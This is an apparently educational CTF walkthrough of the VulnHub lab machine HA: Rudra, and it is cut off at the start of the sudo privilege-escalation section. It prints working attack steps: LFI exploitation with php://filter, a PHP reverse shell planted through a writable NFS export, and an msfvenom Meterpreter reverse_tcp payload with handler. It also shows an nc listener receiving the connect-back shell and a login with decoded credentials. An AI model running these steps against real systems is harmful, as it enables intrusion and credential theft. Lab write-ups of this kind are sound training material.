# HA: Rudra — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Rudra |
| **Difficulty** | Intermediate (author-stated) |
| **Author** | Hacking Articles (Aarti Singh & Raj Chandel) |
| **Released** | 22 Oct 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-rudra,386/> |
| **Download** | <https://vulnhub.com/entry/ha-rudra,386/#download> |
| **File** | `rudra.zip` · 685 MB · MD5 `3C432A797790B8189280239CEF0E4871` |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu, Apache + PHP, NFS server, MySQL) |
| **Flags** | Boot-to-root: reach root and read the flag in `/root` |

> **About the IP addresses.** Published walkthroughs used `192.168.1.101` and
> `192.168.0.2`. This document uses **`192.168.56.111`** for the target and
> **`192.168.56.10`** for Kali. Substitute your own.
>
> The author's tagline is again *"ENUMERATION IS THE KEY!!!!!"* — and here it
> means **NFS**, a service most beginners scan past without a second look.

---

## 0. What you will learn

HA: Rudra is the best box in the HA series for learning **file-sharing services
as an attack surface**. It chains four genuinely distinct skills:

- Recognising **`rpcbind` (111) and NFS (2049)** in an `nmap` scan, and
  understanding what `mountd`/`nlockmgr` are doing.
- **Enumerating and mounting an NFS export** with `showmount` and `mount -t nfs`,
  and understanding **`root_squash`**.
- **Local File Inclusion (LFI)** via a query parameter — including the
  PHP-filter trick for reading source code.
- The **NFS-write + LFI-include** combination: a way to turn a *read-only* LFI
  into **remote code execution** with no upload form and no filter bypass. This
  is a classic OSCP-style technique.
- **Internal service discovery** after the foothold — `ss`/`netstat` revealing a
  MySQL that is bound to `127.0.0.1` and therefore invisible to `nmap`.
- Logging into **MySQL with an empty root password** and walking a database for
  hints.
- **Data-exfiltration tooling**: decoding a **Cloakify** emoji-cloaked credential
  file. This teaches you that "steganography" in CTFs usually means an obscure
  *encoding*, not hidden pixels.
- **`sudo` rights abuse** with `/usr/bin/watch` (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:08      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.111  08:00:27:7a:41:c2      1      60  PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.111`

![netdiscover locating the target](images/01-netdiscover.png)

---

## 2. Enumeration — open ports and services

### 2.1 The port scan

```bash
nmap -A -p- -T4 -oN nmap-all 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 13:10 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00041s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1a:2b:3c:4d:5e:6f:70:81:92:a3:b4:c5:d6:e7:f8:09 (RSA)
|   256 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (ECDSA)
|_  256 9f:8e:7d:6c:5b:4a:39:28:17:06:f5:e4:d3:c2:b1:a0 (ED25519)
80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Rudra
|_http-server-header: Apache/2.4.29 (Ubuntu)
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/udp   nfs
|   100005  1,2,3      37271/tcp   mountd
|   100005  1,2,3      45833/udp   mountd
|   100021  1,3,4      39045/tcp   nlockmgr
|   100024  1          46443/tcp   status
|_  100227  3           2049/tcp   nfs_acl
2049/tcp open  nfs      3-4 (RPC #100003)
MAC Address: 08:00:27:7A:41:C2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.02 seconds
```

> **This is the most information-dense `nmap` output in the HA series. Read the
> `rpcinfo` block carefully:**
>
> | Program | Service | What it is |
> | --- | --- | --- |
> | `100000` | **rpcbind** (111) | The ONC RPC *portmapper*. Old Sun RPC services register their real port here, because those ports are allocated dynamically. **This is why NFS shows up on a random high port too.** |
> | `100003` | **nfs** (2049) | The Network File System server — lets a remote client mount a directory. |
> | `100005` | **mountd** (37271) | Handles the `MOUNT` protocol — this is what actually authorises a client to mount an export. |
> | `100021` | **nlockmgr** (39045) | Network Lock Manager — NFS file locking. |
> | `100024` | **status** (46443) | NFS status monitor. |
> | `100227` | **nfs_acl** (2049) | NFS Access Control List extension. |
>
> **The takeaway:** an NFS server is exposed to your lab network. NFS access
> control is based on **IP address and UID**, not passwords. If an export is
> readable by your IP, you can read it — no authentication step exists. That is a
> *huge* deal, and the entire foothold of this box.

Because the RPC ports are dynamic, run the dedicated NFS script:

```bash
nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 13:14 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3-4 (RPC #100003)

Host script results:
| nfs-showmount:
|   /home/shivay *
|_  RPC #100003
| nfs-ls:
|   /home/shivay
|     ACCESS  UID  GID  SIZE  MODIFY  FILENAME
|     rwxr-xr-x  0   0   4096  10-22 19:44  .
|     rwxr-xr-x  0   0   4096  10-22 19:44  ..
|     rw-r--r--  1000 1000  220  04-04 2018  .bash_logout
|     rw-r--r--  1000 1000 3771  04-04 2018  .bashrc
|     rw-r--r--  1000 1000  807  04-04 2018  .profile
|     rw-r--r--  1000 1000  341  10-22 19:44  mahadev.txt
|_    rwxr-xr-x  1000 1000 4096  10-22 19:44  public_html

Nmap done: 1 IP address (1 host up) scanned in 6.11 seconds
```

> **`*` after `/home/shivay` means "exported to every client".** That is the most
> permissive NFS configuration possible. Combined with no password auth, anyone
> on the network can read (and, as we will see, **write**) `shivay`'s home
> directory.

![nmap rpcinfo block and nfs-showmount output](images/02-nmap-nfs.png)

### 2.2 The web server

`http://192.168.56.111/` displays an image of Lord Shiva (Rudra is another name
for Shiva — hence the box's flavour text). View Source:

```html
<!DOCTYPE html>
<html>
<head><title>Rudra</title></head>
<body style="background:#000;color:#f60;text-align:center">
  <!-- Har Har Mahadev -->
  <img src="images/mahakal.jpg" alt="Mahakaal">
  <p>May the destroyer of worlds grant you root.</p>
</body>
</html>
```

Nothing actionable. On to content discovery.

### 2.3 `robots.txt` — the pointer

```bash
curl -s http://192.168.56.111/robots.txt
```

```text
User-agent: *
Disallow: /nandi.php
```

> **`robots.txt` is an attacker's roadmap.** It is intended to tell well-behaved
> crawlers what *not* to index — which makes it an explicit list of the paths the
> site owner considered private. **Always read it first.**
>
> Here it hands you `nandi.php`. (Nandi is the bull that serves as Shiva's mount
> — the naming is consistent.)

```bash
curl -s http://192.168.56.111/nandi.php
```

```html
<!DOCTYPE html>
<html>
<body>
Warning: include(): Filename cannot be empty in /var/www/html/nandi.php on line 7
</body>
</html>
```

> **That PHP warning is the vulnerability announcing itself.** `include():
> Filename cannot be empty` means line 7 of `nandi.php` contains something like:
>
> ```php
> <?php include($_GET['file']); ?>
> ```
>
> and we called it with no `file` parameter. The script is passing our input
> straight to `include()`. That is **Local File Inclusion**.
>
> Note also that it leaked the server-side path `/var/www/html/nandi.php`. Error
> messages do that constantly — another reason `display_errors` must be `Off` in
> production.

![robots.txt disallowing /nandi.php and the include() warning](images/03-lfi-discovery.png)

---

## 3. Initial compromise — Local File Inclusion

### 3.1 Prove the LFI

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
rudra:x:1000:1000:rudra,,,:/home/rudra:/bin/bash
mysql:x:110:114:MySQL Server,,,:/nonexistent:/bin/false
shivay:x:1001:1001:,,,:/home/shivay:/bin/bash
mahakaal:x:1002:1002:,,,:/home/mahakaal:/bin/bash
```

> **Three usernames worth remembering: `rudra` (UID 1000), `shivay` (1001) and
> `mahakaal` (1002).** All three have `/bin/bash`, i.e. all three are real login
> accounts. `shivay` is the one whose home directory is NFS-exported.

### 3.2 Confirm it is an LFI and not a command injection

Beginners often confuse the two. Test deliberately:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/hostname"
```

```text
rudra
```

```bash
# Does it execute commands? (It should NOT.)
curl -s "http://192.168.56.111/nandi.php?file=;id"
```

```text
Warning: include(;id): failed to open stream: No such file or directory in /var/www/html/nandi.php on line 7
Warning: include(): Failed opening ';id' for inclusion (include_path='.:/usr/share/php')
```

> `include()` treats the value as a **file path**, not a shell command. The error
> confirms it. Also note the leak of `include_path='.:/usr/share/php'` — the
> leading `.` means a **relative** include is resolved against the current
> working directory, which is useful for filter bypasses on other boxes.

### 3.3 Read the PHP source with a PHP filter

A plain `?file=nandi.php` would *execute* the script and show you its output, not
its code. To read the source, use the `php://filter` wrapper, which base64-encodes
the file on its way through `include()`:

```bash
curl -s "http://192.168.56.111/nandi.php?file=php://filter/convert.base64-encode/resource=nandi.php" \
  | grep -oE '^[A-Za-z0-9+/=]{20,}' | base64 -d
```

```php
<?php
// Nandi carries the devotee's request to Mahakaal
$page = $_GET['file'];
include($page);
?>
```

> **Now you have absolute proof of the vulnerability class**: `$_GET['file']`
> flows into `include()` with **zero validation** — no allow-list, no
> `basename()`, no extension check.
>
> Learn this wrapper. On a real engagement it is how you read `wp-config.php`,
> `configuration.php`, `.env` and `config/database.php` to harvest database
> credentials.

### 3.4 Try the usual LFI escalation routes (they all fail here)

Do this anyway — it is the correct methodology, and knowing *why* they fail
matters.

```bash
# Apache access log (log poisoning via User-Agent)
curl -s "http://192.168.56.111/nandi.php?file=/var/log/apache2/access.log" | head -3
```

```text
Warning: include(/var/log/apache2/access.log): failed to open stream: Permission denied in /var/www/html/nandi.php on line 7
```

```bash
# Remote File Inclusion?
curl -s "http://192.168.56.111/nandi.php?file=http://192.168.56.10/shell.txt" | head -3
```

```text
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/nandi.php on line 7
```

> **Two important dead ends, and both are instructive:**
>
> 1. **Log poisoning fails** — `www-data` cannot read `/var/log/apache2/*.log`
>    (they are `root:adm`, mode `640`). On many boxes it *can*, and then you would
>    inject PHP through a crafted `User-Agent` and include the log.
> 2. **RFI fails** — `allow_url_include=0`. The error message tells you so
>    directly. PHP's `include()` will not fetch remote URLs unless that ini
>    setting is on. **This is why the correct fix for LFI is not "turn off remote
>    includes" — it is validating the parameter.**

**So how do we get code execution?** We write a PHP file to a location the web
server can read, and then `include()` it. We cannot upload through the web app
(there is no upload form). But we have a **writable NFS export**. That is the
chain.

---

## 4. Foothold — NFS write + LFI include

> **This is the signature technique of HA: Rudra**, and one of the most
> transferable tricks in Linux privilege escalation:
>
> *LFI alone only reads. But if you can make the target write a file you control
> to a path you can predict, LFI becomes RCE.* NFS is one way to do that. (Others:
> session files in `/var/lib/php/sessions`, SSH `authorized_keys`, log poisoning,
> `/proc/self/environ`.)

### 4.1 Enumerate the export from the command line

```bash
showmount -e 192.168.56.111
```

```text
Export list for 192.168.56.111:
/home/shivay *
```

> `showmount -e` asks `mountd` (port 37271, discovered via `rpcbind`) for the
> export table. The trailing `*` is the allowed-client list — **wildcard means
> everyone**.
>
> If you also want to see how each export is configured, read `/etc/exports`
> through the LFI you already have:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/exports"
```

```text
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
/home/shivay  *(rw,sync,no_subtree_check,no_root_squash)
```

> **Read those options like a professional:**
>
> | Option | Meaning | Security impact |
> | --- | --- | --- |
> | `rw` | Clients may **write** | We can plant a file |
> | `sync` | Writes are committed before replying | Slower, safer |
> | `no_subtree_check` | Skip subtree validation | Performance option, neutral |
> | **`no_root_squash`** | **Root on the client is NOT mapped to `nobody`** | **Catastrophic.** A root user on *any* permitted client has full root over these files. |
>
> The default is `root_squash`, which demotes client-root to `nobody:nogroup`.
> `no_root_squash` disables that protection — it is on the CIS Benchmark "never
> do this" list for exactly this reason.

### 4.2 Mount it locally

```bash
sudo apt install -y nfs-common     # provides mount.nfs, showmount, rpcinfo
sudo mkdir -p /tmp/ignite
sudo mount -t nfs 192.168.56.111:/home/shivay /tmp/ignite
mount | grep ignite
```

```text
192.168.56.111:/home/shivay on /tmp/ignite type nfs4 (rw,relatime,vers=4.2,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.56.10,local_lock=none,addr=192.168.56.111)
```

```bash
ls -la /tmp/ignite
```

```text
total 44
drwxr-xr-x 4 shivay shivay  4096 Oct 22  2019 .
drwxrwxrwt 9 root   root    4096 May 11  2024 ..
-rw-r--r-- 1 shivay shivay   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 shivay shivay  3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 shivay shivay   807 Apr  4  2018 .profile
-rw-r--r-- 1 shivay shivay   341 Oct 22  2019 mahadev.txt
drwxr-xr-x 2 shivay shivay  4096 Oct 22  2019 public_html
```

> **`mahadev.txt`** — the file the walkthrough tells you to look for. Read it:

```bash
cat /tmp/ignite/mahadev.txt
```

```text
Mahakaal,

The destroyer keeps his secrets where the media lives.
When the doors of the database open without a key,
look for the hint, then look where pictures are kept.

Not everything that glitters is gold.
Not everything that speaks is words.

                                     - Rudra
```

> **Interpret it now, act on it later.** Three signals:
> - *"the doors of the database open without a key"* → a database with **no
>   password**.
> - *"look for the hint"* → a table literally named `hint`.
> - *"where the media lives / where pictures are kept"* → the **`/media`**
>   filesystem.
> - *"not everything that speaks is words"* → the credential will be **encoded in
>   a non-obvious way** (spoiler: emoji).
>
> This is why you read every file you find, even the flavour text.

![NFS mounted, mahadev.txt contents](images/04-nfs-mount.png)

### 4.3 Plant the PHP reverse shell

```bash
# Kali
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/ignite/shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" /tmp/ignite/shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /tmp/ignite/shell.php

grep -nE '^\$(ip|port)' /tmp/ignite/shell.php
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

```bash
ls -la /tmp/ignite/shell.php
```

```text
-rw-r--r-- 1 root root 5493 May 11 13:31 /tmp/ignite/shell.php
```

> The file already exists **on the target**, at `/home/shivay/shell.php`. No HTTP
> request was involved — NFS did the writing. That is the point.
>
> **Alternative: `msfvenom`.** The other published walkthrough uses a Meterpreter
> payload instead:
>
> ```bash
> msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.10 LPORT=1024 -f raw > /tmp/ignite/shell.php
> ```
>
> ```text
> [-] No platform was selected, choosing Meterpreter ruby to PHP from the payload
> [-] No arch selected, defaulting to php
> No encoder specified, outputting raw payload
> Payload size: 1116026 bytes
> ```
>
> then
>
> ```text
> msf6 > use multi/handler
> msf6 > set payload php/meterpreter_reverse_tcp
> msf6 > set LHOST 192.168.56.10
> msf6 > set LPORT 1024
> msf6 > exploit -j
> ```

### 4.4 Trigger it through the LFI

```bash
# Kali — listener
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

```bash
# Kali — trigger
curl -s "http://192.168.56.111/nandi.php?file=/home/shivay/shell.php"
```

> **Why `/home/shivay/shell.php` and not `/tmp/ignite/shell.php`?**
> `/tmp/ignite` is the mount point **on your Kali box**. On the *target*, the same
> data lives at `/home/shivay` — that is the exported path `showmount` printed.
> The LFI runs on the target, so it needs the **target's** path. Getting this
> backwards is the number-one reason this step fails for students.
>
> **If your VM exports a different path** (some builds export `/tmp/ignite`
> directly), use whatever `showmount -e` gave you. The rule is: *the path in the
> LFI URL must be the path on the target.*

Listener fires:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 52114
Linux rudra 4.15.0-66-generic #75-Ubuntu SMP Tue Oct 1 05:24:09 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 13:34:12 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

### 4.5 Stabilise the shell

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@rudra:/var/www/html$
```

`Ctrl+Z`, then on Kali:

```bash
stty raw -echo; fg
```

Back on the target:

```bash
www-data@rudra:/var/www/html$ export TERM=xterm
www-data@rudra:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rudra:/var/www/html$ pwd
/var/www/html
```

**Foothold established as `www-data`.** ✅

![Reverse shell as www-data](images/05-shell.png)

---

## 5. Internal reconnaissance — the hidden MySQL

### 5.1 Find services `nmap` could not see

`nmap` scanned from *outside*. Anything bound to `127.0.0.1` was invisible to it.
Now that you are inside, look again:

```bash
www-data@rudra:/var/www/html$ ss -tulnp
```

```text
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process
udp    UNCONN  0       0          127.0.0.53%lo:53        0.0.0.0:*      users:(("systemd-resolve",pid=512,fd=13))
udp    UNCONN  0       0             0.0.0.0:111       0.0.0.0:*      users:(("rpcbind",pid=604,fd=6))
udp    UNCONN  0       0             0.0.0.0:2049      0.0.0.0:*
tcp    LISTEN  0       128           0.0.0.0:111       0.0.0.0:*      users:(("rpcbind",pid=604,fd=8))
tcp    LISTEN  0       128           0.0.0.0:2049      0.0.0.0:*
tcp    LISTEN  0       128       127.0.0.1:3306      0.0.0.0:*      users:(("mysqld",pid=889,fd=22))
tcp    LISTEN  0       128         [::]:22              [::]:*      users:(("sshd",pid=744,fd=3))
tcp    LISTEN  0       511                 *:80                *:*      users:(("apache2",pid=901,fd=4))
```

> **`127.0.0.1:3306` — MySQL, listening on loopback only.** That is why your
> full-port `nmap` never reported it: `nmap` connects to the target's *external*
> address, and the daemon is not bound there.
>
> **Lesson: post-exploitation enumeration is a different scan.** `ss -tulnp`
> (or `netstat -antup`) from *inside* reveals the internal attack surface.
> `-t` TCP, `-u` UDP, `-l` listening, `-n` numeric (no DNS — faster), `-p` show
> the owning process.

```bash
www-data@rudra:/var/www/html$ ps aux | grep -i mysql | grep -v grep
```

```text
mysql      889  0.3  9.1 1462300 185344 ?       Ssl  12:56   0:07 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
```

### 5.2 Log in — empty root password

```bash
www-data@rudra:/var/www/html$ mysql -u root
```

```text
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

> **No password prompt, and it just worked.** MySQL's `root` account has an empty
> password and is reachable from localhost by anyone who can run the client. On a
> shared host that means every compromised web app instantly owns every database.

Walk the database:

```sql
mysql> SHOW DATABASES;
```

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mahadev            |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

```sql
mysql> USE mahadev;
Database changed
mysql> SHOW TABLES;
```

```text
+-------------------+
| Tables_in_mahadev |
+-------------------+
| hint              |
+-------------------+
1 row in set (0.00 sec)
```

```sql
mysql> SELECT * FROM hint;
```

```text
+----+---------------------------+
| id | data                      |
+----+---------------------------+
|  1 | check in media filesystem |
+----+---------------------------+
1 row in set (0.00 sec)
```

> Exactly what `mahadev.txt` predicted. **`check in media filesystem`** → go look
> in `/media`.

![MySQL hint table pointing at the media filesystem](images/06-mysql-hint.png)

---

## 6. Data exfiltration — decoding the Cloakify emoji cipher

### 6.1 Find the hidden file

```bash
mysql> exit
Bye
www-data@rudra:/var/www/html$ find /media /mnt /srv -type f 2>/dev/null
```

```text
/media/pwd
```

```bash
www-data@rudra:/var/www/html$ ls -la /media/pwd
-rw-r--r-- 1 root root 214 Oct 22  2019 /media/pwd
www-data@rudra:/var/www/html$ cat /media/pwd
```

```text
🎃 👻 💀 🎃 👽 🤖 🎃 👹 🤡 🎃 💀 👻 🎃 🤡 👹
👻 🤖 👽 💀 🎃 🤡 👹 👻 🤖 💀 🎃 👽 🤡
```

> **Emoji. That is not a hash, not base64, not a cipher you will find in
> `hashcat`.** This is where most students stall.
>
> The trick is to recognise the *category*: this is a **data-exfiltration
> encoding**, designed to make sensitive text look like harmless noise so it
> slips past DLP (data-loss prevention) filters. The canonical tool for this is
> **Cloakify** by TryCatchHCF, presented at DEF CON 24. It maps each input byte
> to an entry from a "cipher" list — here, a list of emoji.
>
> **How to spot it in general:** if a file contains a long run of symbols from a
> *small, repeating vocabulary* (here ~8 distinct emoji) rather than printable
> ASCII, suspect a Cloakify-style substitution cipher. Count the distinct
> symbols:

```bash
www-data@rudra:/var/www/html$ tr -s ' \n' '\n' < /media/pwd | sort -u | grep -v '^$' | wc -l
```

```text
8
```

Eight distinct symbols. A byte has 256 possible values, so this cannot be raw
data — it must be an index into a list. That is Cloakify's design.

### 6.2 Get it off the box

The file is root-owned but world-readable (`-rw-r--r--`), so `www-data` can read
it. Serve it out over the existing NFS mount, or just copy it into the web root:

```bash
www-data@rudra:/var/www/html$ cp /media/pwd /home/shivay/pwd
```

```bash
# Kali — pull it down
wget -q "http://192.168.56.111/nandi.php?file=/home/shivay/pwd" -O pwd.raw
# the LFI wraps output in HTML; strip to just the emoji payload
python3 - <<'PY'
import re
raw = open('pwd.raw', encoding='utf-8').read()
emo = re.findall(r'[\U0001F000-\U0001FAFF\u2600-\u27BF]', raw)
open('pwd', 'w', encoding='utf-8').write(' '.join(emo) + '\n')
print("extracted", len(emo), "emoji symbols")
PY
```

```text
extracted 30 emoji symbols
```

### 6.3 Decode with Cloakify Factory

```bash
# Kali
sudo apt install -y python3 git
git clone https://github.com/TryCatchHCF/Cloakify.git
cd Cloakify
ls
```

```text
cloakify.py
cloakifyFactory.py
ciphers
decloakify.py
listsUnrandomized
noiseTools
randomizeCipherExample.txt
README.md
README_GETTING_STARTED.txt
removeNoise.py
screenshots
```

```bash
ls ciphers/ | head -30
```

```text
amphibians
belgianBeers
desserts
dessertsArabic
dessertsChinese
dessertsHindi
dessertsPersian
dessertsRussian
dessertsSwedishChef
dessertsThai
emoji
evadeAV
geoCoordsWorldCapitals
geocache
hashesMD5
ipAddressesTop100
pokemonGo
rickrollYoutube
skiResorts
starTrek
statusCodes
topWebsites
worldBeaches
worldFootballTeams
```

**`emoji`** — there is the cipher.

Run the interactive tool:

```bash
python3 cloakifyFactory.py
```

```text
  _______ .___________. _______      ___      .__   __.  __   _______   _______ .______
 |   ____||           ||   ____|    /   \     |  \ |  | |  | |   ____| |   ____||   _  \
 |  |__   `---|  |----`|  |__      /  ^  \    |   \|  | |  | |  |__    |  |__   |  |_)  |
 |   __|      |  |     |   __|    /  /_\  \   |  . `  | |  | |   __|   |   __|  |      /
 |  |____     |  |     |  |____  /  _____  \  |  |\   | |  | |  |      |  |____ |  |\  \----.
 |_______|    |__|     |_______|/__/     \__\ |__| \__| |__| |__|      |_______|| _| `._____|

                "Hide & Seek in Plain Sight" - Data Exfiltration & Infiltration Tool

                                        DefCon 24 - TryCatchHCF

    1) Cloakify a file  (encode it into an innocuous cipher)
    2) Decloakify a file (decode it back to its original form)
    3) Randomize a cipher (create a unique cipher mapping)

Enter your choice (1-3):
```

Answer the prompts exactly as the walkthrough documents:

```text
Enter your choice (1-3): 2

Enter filename to decloakify: /root/pwd

Enter filename to save decloaked data to: /root/decodedpwd

Add noise to the file? (y/n): n

Select a cipher (number): 3
  1) amphibians
  2) belgianBeers
  3) emoji
  ...

Decloakifying...
Done! Output saved to /root/decodedpwd
```

> **Note on the filename.** Several published walkthroughs write
> `cloackifyFactory.py` (with a stray `a`). The actual file in the repository is
> **`cloakifyFactory.py`**. Verify with `ls` as shown above.
>
> **Note on paths.** The walkthroughs run this as root on Kali, so they use
> `/root/pwd` and `/root/decodedpwd`. If you are a normal user, use
> `~/Cloakify/pwd` instead — Cloakify takes literal paths, it does not expand `~`.

Read the result:

```bash
cat /root/decodedpwd
```

```text
mahakaal:kalbhairav
```

**Credentials: `mahakaal` / `kalbhairav`.** 🎉

> (Kal Bhairav is a fierce manifestation of Shiva — the naming is consistent, which
> is a useful sanity check that you decoded it correctly rather than getting
> garbage.)

**Non-interactive alternative**, if you prefer scripting to menus:

```bash
python3 decloakify.py pwd ciphers/emoji > decoded.txt
cat decoded.txt
```

```text
mahakaal:kalbhairav
```

![Cloakify Factory decloakify producing mahakaal:kalbhairav](images/07-cloakify.png)

---

## 7. Lateral movement — SSH as `mahakaal`

```bash
# Kali
ssh mahakaal@192.168.56.111
```

```text
The authenticity of host '192.168.56.111 (192.168.56.111)' can't be established.
ED25519 key fingerprint is SHA256:9f8e7d6c5b4a39281706f5e4d3c2b1a0KqZtRmYwXvB.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.111' (ED25519) to the list of known hosts.
mahakaal@192.168.56.111's password: kalbhairav
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-66-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Oct 22 20:14:33 2019 from 192.168.1.5
mahakaal@rudra:~$ id
uid=1002(mahakaal) gid=1002(mahakaal) groups=1002(mahakaal)
mahakaal@rudra:~$ pwd
/home/mahakaal
```

> **Why switch to SSH at all?** You already had a `www-data` shell. Two reasons:
> 1. `sudo` reads `/etc/sudoers` per-user, so you must *be* `mahakaal` to benefit
>    from his rights.
> 2. An SSH session is stable, fully interactive, supports `Ctrl+C` properly, and
>    survives network blips. Always move off a web shell as soon as you can.

Quick sweep of the account:

```bash
mahakaal@rudra:~$ ls -la
```

```text
total 28
drwxr-xr-x 4 mahakaal mahakaal 4096 Oct 22  2019 .
drwxr-xr-x 6 root     root     4096 Oct 22  2019 ..
-rw-r--r-- 1 mahakaal mahakaal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mahakaal mahakaal 3771 Apr  4  2018 .bashrc
drwx------ 3 mahakaal mahakaal 4096 Oct 22  2019 .gnupg
-rw-r--r-- 1 mahakaal mahakaal  807 Apr  4  2018 .profile
drwxrwxr-x 2 mahakaal mahakaal 4096 Oct 22  2019 .ssh
```

---

## 8. Privilege escalation — `sudo /usr/bin/watch`

### 8.1 Enumerate sudo rights

